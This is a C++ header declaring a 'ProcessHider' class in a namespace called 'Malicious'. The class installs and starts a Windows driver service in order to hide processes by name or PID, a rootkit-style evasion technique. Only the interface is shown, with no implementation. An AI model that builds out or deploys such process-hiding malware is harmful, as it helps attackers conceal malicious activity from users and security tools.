#pragma once

#include <common/Exception.hpp>

#include <string>
#include <windows.h>
#include <winioctl.h>

namespace Malicious
{
	typedef Common::Exception DriverError;

    class ProcessHider
    {
        public:

            ProcessHider();
            ~ProcessHider();
            void hide(const std::string& processName);
            void hide(unsigned long processPid);
            void remove();

        private:
            
            void installService();
            void removeService();
            void openServiceManager();
            void closeServiceManager();
            void openService();
            void closeService();
            void startService();
            void stopService();

            std::string driverPath;
            SC_HANDLE manager;
            SC_HANDLE service;
    };
    
} // Malicious
